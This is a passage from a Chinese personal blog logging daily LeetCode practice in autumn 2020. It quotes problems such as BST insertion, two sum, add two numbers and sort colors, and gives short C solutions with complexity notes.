&lt;= val &lt;= 10^8<br>新值和原始二叉搜索树中的任意节点值都不同</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/insert-into-a-binary-search-tree" target="_blank" rel="noopener">https://leetcode-cn.com/problems/insert-into-a-binary-search-tree</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><h4 id="解法：深度优先搜索（DFS）-1"><a href="#解法：深度优先搜索（DFS）-1" class="headerlink" title="解法：深度优先搜索（DFS）"></a>解法：深度优先搜索（DFS）</h4><p>深度优先搜索遍历这棵树， <strong>插入值大于结点值则往右子树插，否则往左子树插</strong></p><p><strong>递归</strong>可以很方便地解决这个问题</p><h4 id="时间复杂度：-4"><a href="#时间复杂度：-4" class="headerlink" title="时间复杂度："></a>时间复杂度：</h4><p>每个结点都有可能过一遍，所以时间复杂度是<strong>O</strong>(<strong>N</strong>)</p><h4 id="空间复杂度：-4"><a href="#空间复杂度：-4" class="headerlink" title="空间复杂度："></a>空间复杂度：</h4><p>每个结点都要开辟一个单独的栈帧空间，故空间复杂度为<strong>O</strong>(<strong>N</strong>)</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(struct TreeNode* root, <span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(val &gt; root-&gt;val)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!root-&gt;right)</span><br><span class="line">        &#123;</span><br><span class="line">            root-&gt;right = (struct TreeNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct TreeNode));</span><br><span class="line">            root-&gt;right-&gt;val = val;</span><br><span class="line">            root-&gt;right-&gt;left = <span class="literal">NULL</span>;</span><br><span class="line">            root-&gt;right-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            dfs(root-&gt;right, val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!root-&gt;left)</span><br><span class="line">        &#123;</span><br><span class="line">            root-&gt;left = (struct TreeNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct TreeNode));</span><br><span class="line">            root-&gt;left-&gt;val = val;</span><br><span class="line">            root-&gt;left-&gt;left = <span class="literal">NULL</span>;</span><br><span class="line">            root-&gt;left-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            dfs(root-&gt;left, val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">struct TreeNode* <span class="title">insertIntoBST</span><span class="params">(struct TreeNode* root, <span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">    &#123;</span><br><span class="line">        root = (struct TreeNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct TreeNode));</span><br><span class="line">        root-&gt;left = <span class="literal">NULL</span>;</span><br><span class="line">        root-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line">        root-&gt;val = val;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">    dfs(root, val);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>![Z08G_KN_4GTD1`J_3NC0__F.png](<a href="https://i.loli.net/2020/09/30/EUIqglNFiRvJCoz.png" target="_blank" rel="noopener">https://i.loli.net/2020/09/30/EUIqglNFiRvJCoz.png</a>)</p><blockquote><p>又是能够早睡的一个晚上（确信</p><p>九月结束🌶</p></blockquote><h2 id="October"><a href="#October" class="headerlink" title="October"></a>October</h2><h3 id="1-LCP-19-秋叶收藏集（中等）"><a href="#1-LCP-19-秋叶收藏集（中等）" class="headerlink" title="1 - LCP 19. 秋叶收藏集（中等）"></a>1 - <a href="https://leetcode-cn.com/problems/UlBDOe/" target="_blank" rel="noopener">LCP 19. 秋叶收藏集（中等）</a></h3><blockquote><p>小扣出去秋游，途中收集了一些红叶和黄叶，他利用这些叶子初步整理了一份秋叶收藏集 leaves， 字符串 leaves 仅包含小写字符 r 和 y， 其中字符 r 表示一片红叶，字符 y 表示一片黄叶。<br>出于美观整齐的考虑，小扣想要将收藏集中树叶的排列调整成「红、黄、红」三部分。每部分树叶数量可以不相等，但均需大于等于 1。每次调整操作，小扣可以将一片红叶替换成黄叶或者将一片黄叶替换成红叶。请问小扣最少需要多少次调整操作才能将秋叶收藏集调整完毕。</p><p>示例 1：</p><p>输入：leaves = “rrryyyrryyyrr”</p><p>输出：2</p><p>解释：调整两次，将中间的两片红叶替换成黄叶，得到 “rrryyyyyyyyrr”</p><p>示例 2：</p><p>输入：leaves = “ryr”</p><p>输出：0</p><p>解释：已符合要求，不需要额外操作</p><p>提示：</p><p>3 &lt;= leaves.length &lt;= 10^5<br>leaves 中只包含字符 ‘r’ 和字符 ‘y’</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/UlBDOe" target="_blank" rel="noopener">https://leetcode-cn.com/problems/UlBDOe</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>最近忙着自闭（x）</p><p>解法动态规划，题解有时间再回来写（咕咕咕</p><p><img src="https://i.loli.net/2020/10/02/HrSx812GPa97JtT.png" alt="image.png"></p><h3 id="2-771-宝石与石头（简单）"><a href="#2-771-宝石与石头（简单）" class="headerlink" title="2 - 771. 宝石与石头（简单）"></a>2 - <a href="https://leetcode-cn.com/problems/jewels-and-stones/" target="_blank" rel="noopener">771. 宝石与石头（简单）</a></h3><blockquote><p> 给定字符串J 代表石头中宝石的类型，和字符串 S代表你拥有的石头。 S 中每个字符代表了一种你拥有的石头的类型，你想知道你拥有的石头中有多少是宝石。</p><p>J 中的字母不重复，J 和 S中的所有字符都是字母。字母区分大小写，因此”a”和”A”是不同类型的石头。</p><p>示例 1:</p><p>输入: J = “aA”, S = “aAAbbbb”<br>输出: 3<br>示例 2:</p><p>输入: J = “z”, S = “ZZ”<br>输出: 0<br>注意:</p><p>S 和 J 最多含有50个字母。<br> J 中的字符不重复。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/jewels-and-stones" target="_blank" rel="noopener">https://leetcode-cn.com/problems/jewels-and-stones</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>用一个数组来保存有的宝石再遍历石头即可</p><p>因为是字符型，方便起见可以直接用一个128大小的数组来储存信息</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">numJewelsInStones</span><span class="params">(<span class="keyword">char</span> * J, <span class="keyword">char</span> * S)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">map</span>[<span class="number">128</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(*J)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="built_in">map</span>[*J]))</span><br><span class="line">            <span class="built_in">map</span>[*J] = <span class="number">1</span>;</span><br><span class="line">        J++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">while</span>(*S)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>((<span class="built_in">map</span>[*S]))</span><br><span class="line">            num++;</span><br><span class="line">        S++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>![KE97BAWWD__F`_X6X__``79.png](<a href="https://i.loli.net/2020/10/03/fGq8SYicjhrBIeN.png" target="_blank" rel="noopener">https://i.loli.net/2020/10/03/fGq8SYicjhrBIeN.png</a>)</p><h3 id="3-1-两数之和（简单）"><a href="#3-1-两数之和（简单）" class="headerlink" title="3 - 1. 两数之和（简单）"></a>3 - <a href="https://leetcode-cn.com/problems/two-sum/" target="_blank" rel="noopener">1. 两数之和（简单）</a></h3><blockquote><p>给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那 两个 整数，并返回他们的数组下标。</p><p>你可以假设每种输入只会对应一个答案。但是，数组中同一个元素不能使用两遍。</p><p>示例:</p><p>给定 nums = [2, 7, 11, 15], target = 9</p><p>因为 nums[0] + nums[1] = 2 + 7 = 9<br>所以返回 [0, 1]</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/two-sum" target="_blank" rel="noopener">https://leetcode-cn.com/problems/two-sum</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p><del>不忘初心牢记使命</del></p><p>是Leetcode的第一题呢</p><p><strong>暴力枚举</strong>即可</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">twoSum</span><span class="params">(<span class="keyword">int</span>* nums, <span class="keyword">int</span> numsSize, <span class="keyword">int</span> target, <span class="keyword">int</span>* returnSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> * retn = (<span class="keyword">int</span>*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*<span class="number">2</span>);</span><br><span class="line">    *returnSize = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;numsSize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;numsSize;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] + nums[j] == target)</span><br><span class="line">            &#123;</span><br><span class="line">                retn[<span class="number">0</span>] = i;</span><br><span class="line">                retn[<span class="number">1</span>] = j;</span><br><span class="line">                <span class="keyword">return</span> retn;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> retn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>![R`X_RZK1I6_HG7_PV81~RNB.png](<a href="https://i.loli.net/2020/10/03/f8VGlqdrtjUIRsO.png" target="_blank" rel="noopener">https://i.loli.net/2020/10/03/f8VGlqdrtjUIRsO.png</a>)</p><h3 id="4-2-两数相加（中等）"><a href="#4-2-两数相加（中等）" class="headerlink" title="4 - 2. 两数相加（中等）"></a>4 - <a href="https://leetcode-cn.com/problems/add-two-numbers/" target="_blank" rel="noopener">2. 两数相加（中等）</a></h3><blockquote><p>给出两个 非空 的链表用来表示两个非负的整数。其中，它们各自的位数是按照 逆序 的方式存储的，并且它们的每个节点只能存储 一位 数字。</p><p>如果，我们将这两个数相加起来，则会返回一个新的链表来表示它们的和。</p><p>您可以假设除了数字 0 之外，这两个数都不会以 0 开头。</p><p>示例：</p><p>输入：(2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)<br>输出：7 -&gt; 0 -&gt; 8<br>原因：342 + 465 = 807</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/add-two-numbers" target="_blank" rel="noopener">https://leetcode-cn.com/problems/add-two-numbers</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>呐，梦开始的地方呢。</p><h4 id="解法：模拟法"><a href="#解法：模拟法" class="headerlink" title="解法：模拟法"></a>解法：模拟法</h4><p>模拟常规的加法过程即可</p><p>需要注意的是原结点的空间是可被复用的</p><h4 id="时间复杂度：-5"><a href="#时间复杂度：-5" class="headerlink" title="时间复杂度："></a>时间复杂度：</h4><p>需要遍历max(m,n)个结点（其中m为l1长度，n为l2长度），故时间复杂度为<strong>O</strong>(<strong>MAX</strong>(<strong>M,N</strong>))</p><h4 id="空间复杂度：-5"><a href="#空间复杂度：-5" class="headerlink" title="空间复杂度："></a>空间复杂度：</h4><p>只需要临时变量的常数空间，故空间复杂度为<strong>O</strong>(<strong>1</strong>)</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">struct ListNode* <span class="title">addTwoNumbers</span><span class="params">(struct ListNode* l1, struct ListNode* l2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!l1)</span><br><span class="line">        <span class="keyword">return</span> l2;</span><br><span class="line">    <span class="keyword">if</span>(!l2)</span><br><span class="line">        <span class="keyword">return</span> l1; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">tail</span>, *<span class="title">retn</span> = <span class="title">l1</span>;</span></span><br><span class="line">    <span class="keyword">int</span> plus = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(l1 &amp;&amp; l2)</span><br><span class="line">    &#123;</span><br><span class="line">        l1-&gt;val += l2-&gt;val + plus;</span><br><span class="line">        plus = l1-&gt;val / <span class="number">10</span>;</span><br><span class="line">        l1-&gt;val %= <span class="number">10</span>;</span><br><span class="line">        tail = l1;</span><br><span class="line">        l1 = l1-&gt;next;</span><br><span class="line">        l2 = l2-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(l1)</span><br><span class="line">    &#123;</span><br><span class="line">        l1-&gt;val += plus;</span><br><span class="line">        plus = l1-&gt;val / <span class="number">10</span>;</span><br><span class="line">        l1-&gt;val %= <span class="number">10</span>;</span><br><span class="line">        tail = l1;</span><br><span class="line">        l1 = l1-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(l2)</span><br><span class="line">        tail-&gt;next = l2;</span><br><span class="line">    <span class="keyword">while</span>(l2)</span><br><span class="line">    &#123;</span><br><span class="line">        l2-&gt;val += plus;</span><br><span class="line">        plus = l2-&gt;val / <span class="number">10</span>;</span><br><span class="line">        l2-&gt;val %= <span class="number">10</span>;</span><br><span class="line">        tail = l2;</span><br><span class="line">        l2 = l2-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(plus)</span><br><span class="line">    &#123;</span><br><span class="line">        tail-&gt;next = (struct ListNode *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct ListNode));</span><br><span class="line">        tail-&gt;next-&gt;val = plus;</span><br><span class="line">        tail-&gt;next-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> retn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/04/uSQzNqR4AcZYTtX.png" alt="image.png"></p><h3 id="5-18-四数之和（中等）"><a href="#5-18-四数之和（中等）" class="headerlink" title="5 - 18. 四数之和（中等）"></a>5 - <a href="https://leetcode-cn.com/problems/4sum/" target="_blank" rel="noopener">18. 四数之和（中等）</a></h3><blockquote><p>给定一个包含 n 个整数的数组 nums 和一个目标值 target，判断 nums 中是否存在四个元素 a，b，c 和 d ，使得 a + b + c + d 的值与 target 相等？找出所有满足条件且不重复的四元组。</p><p>注意：</p><p>答案中不可以包含重复的四元组。</p><p>示例：</p><p>给定数组 nums = [1, 0, -1, 0, -2, 2]，和 target = 0。</p><p>满足要求的四元组集合为：<br>[<br>  [-1,  0, 0, 1],<br>  [-2, -1, 1, 2],<br>  [-2,  0, 0, 2]<br>]</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/4sum" target="_blank" rel="noopener">https://leetcode-cn.com/problems/4sum</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>双指针哈希，留周末再写解法了</p><h3 id="6-834-树中距离之和（困难）"><a href="#6-834-树中距离之和（困难）" class="headerlink" title="6 - 834. 树中距离之和（困难）"></a>6 - <a href="https://leetcode-cn.com/problems/sum-of-distances-in-tree/" target="_blank" rel="noopener">834. 树中距离之和（困难）</a></h3><blockquote><p>给定一个无向、连通的树。树中有 N 个标记为 0…N-1 的节点以及 N-1 条边 。</p><p>第 i 条边连接节点 edges[i][0] 和 edges[i][1] 。</p><p>返回一个表示节点 i 与其他所有节点距离之和的列表 ans。</p><p>示例 1:</p><p>输入: N = 6, edges = [[0,1],[0,2],[2,3],[2,4],[2,5]]<br>输出: [8,12,6,10,10,10]<br>解释:<br>如下为给定的树的示意图：<br>  0<br> / <br>1   2<br>   /|<br>  3 4 5</p><p>我们可以计算出 dist(0,1) + dist(0,2) + dist(0,3) + dist(0,4) + dist(0,5)<br>也就是 1 + 1 + 2 + 2 + 2 = 8。 因此，answer[0] = 8，以此类推。<br>说明: 1 &lt;= N &lt;= 10000</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/sum-of-distances-in-tree" target="_blank" rel="noopener">https://leetcode-cn.com/problems/sum-of-distances-in-tree</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>动态规划，周末写解法，最近忙的很</p><h3 id="7-75-颜色分类（中等）"><a href="#7-75-颜色分类（中等）" class="headerlink" title="7 - 75. 颜色分类（中等）"></a>7 - <a href="https://leetcode-cn.com/problems/sort-colors/" target="_blank" rel="noopener">75. 颜色分类（中等）</a></h3><blockquote><p>给定一个包含红色、白色和蓝色，一共 n 个元素的数组，原地对它们进行排序，使得相同颜色的元素相邻，并按照红色、白色、蓝色顺序排列。</p><p>此题中，我们使用整数 0、 1 和 2 分别表示红色、白色和蓝色。</p><p>注意:<br>不能使用代码库中的排序函数来解决这道题。</p><p>示例:</p><p>输入: [2,0,2,1,1,0]<br>输出: [0,0,1,1,2,2]<br>进阶：</p><p>一个直观的解决方案是使用计数排序的两趟扫描算法。<br>首先，迭代计算出0、1 和 2 元素的个数，然后按照0、1、2的排序，重写当前数组。<br>你能想出一个仅使用常数空间的一趟扫描算法吗？</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/sort-colors" target="_blank" rel="noopener">https://leetcode-cn.com/problems/sort-colors</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>因为只需要排序三种颜色，故考虑将数组分成三块，两趟遍历，第一趟把所有的0放在前面，第二趟把所有的1放在中间即可，在交换的过程中2自然会全部堆到末尾</p><h4 id="时间复杂度：-6"><a href="#时间复杂度：-6" class="headerlink" title="时间复杂度："></a>时间复杂度：</h4><p>最坏情况下两趟完整遍历，最好情况下遍历一趟，时间复杂度为<strong>O</strong>(<strong>N</strong>)</p><h4 id="空间复杂度：-6"><a href="#空间复杂度：-6" class="headerlink" title="空间复杂度："></a>空间复杂度：</h4><p>只需要常数级别的额外空间，故空间复杂度为<strong>O</strong>(<strong>1</strong>)</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sortColors</span><span class="params">(<span class="keyword">int</span>* nums, <span class="keyword">int</span> numsSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;numsSize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;numsSize;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] &lt; nums[j])</span><br><span class="line">            &#123;</span><br><span class="line">                temp = nums[i];</span><br><span class="line">                nums[i] = nums[j];</span><br><span class="line">                nums[j] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/07/MEFrixChODK4c1n.png" alt="IF_F__@A8_F7PD_X_RFR8AA.png"></p><h3 id="8-344-反转字符串（简单）"><a href="#8-344-反转字符串（简单）" class="headerlink" title="8 - 344. 反转字符串（简单）"></a>8 - <a href="https://leetcode-cn.com/problems/reverse-string/" target="_blank" rel="noopener">344. 反转字符串（简单）</a></h3><blockquote><p>编写一个函数，其作用是将输入的字符串反转过来。输入字符串以字符数组 char[] 的形式给出。</p><p>不要给另外的数组分配额外的空间，你必须原地修改输入数组、使用 O(1) 的额外空间解决这一问题。</p><p>你可以假设数组中的所有字符都是 ASCII 码表中的可打印字符。</p><p>示例 1：</p><p>输入：[“h”,”e”,”l”,”l”,”o”]<br>输出：[“o”,”l”,”l”,”e”,”h”]<br>示例 2：</p><p>输入：[“H”,”a”,”n”,”n”,”a”,”h”]<br>输出：[“h”,”a”,”n”,”n”,”a”,”H”]</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/reverse-string" target="_blank" rel="noopener">https://leetcode-cn.com/problems/reverse-string</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>原地交换即可</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverseString</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">int</span> sSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> temp;</span><br><span class="line">    <span class="keyword">int</span> len = sSize/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        temp=s[i];</span><br><span class="line">        s[i]=s[sSize-i<span class="number">-1</span>];</span><br><span class="line">        s[sSize-i<span class="number">-1</span>]=temp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/08/EzXUN93shxaOjVn.png" alt="image.png"></p><h3 id="9-141-环形链表（简单）"><a href="#9-141-环形链表（简单）" class="headerlink" title="9 - 141. 环形链表（简单）"></a>9 - <a href="https://leetcode-cn.com/problems/linked-list-cycle/" target="_blank" rel="noopener">141. 环形链表（简单）</a></h3><blockquote><p>给定一个链表，判断链表中是否有环。</p><p>如果链表中有某个节点，可以通过连续跟踪 next 指针再次到达，则链表中存在环。 为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。注意：pos 不作为参数进行传递，仅仅是为了标识链表的实际情况。</p><p>如果链表中存在环，则返回 true 。 否则，返回 false 。</p><p>进阶：</p><p>你能用 O(1)（即，常量）内存解决此问题吗？</p><p>示例 1：</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist.png" alt="image.png"></p><p>输入：head = [3,2,0,-4], pos = 1<br>输出：true<br>解释：链表中有一个环，其尾部连接到第二个节点。<br>示例 2：</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist_test2.png" alt="image.png"></p><p>输入：head = [1,2], pos = 0<br>输出：true<br>解释：链表中有一个环，其尾部连接到第一个节点。<br>示例 3：</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist_test3.png" alt="image.png"></p><p>输入：head = [1], pos = -1<br>输出：false<br>解释：链表中没有环。</p><p>提示：</p><p>链表中节点的数目范围是 [0, 104]<br>-105 &lt;= Node.val &lt;= 105<br>pos 为 -1 或者链表中的一个 有效索引 。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/linked-list-cycle" target="_blank" rel="noopener">https://leetcode-cn.com/problems/linked-list-cycle</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><h4 id="解法一：快慢指针"><a href="#解法一：快慢指针" class="headerlink" 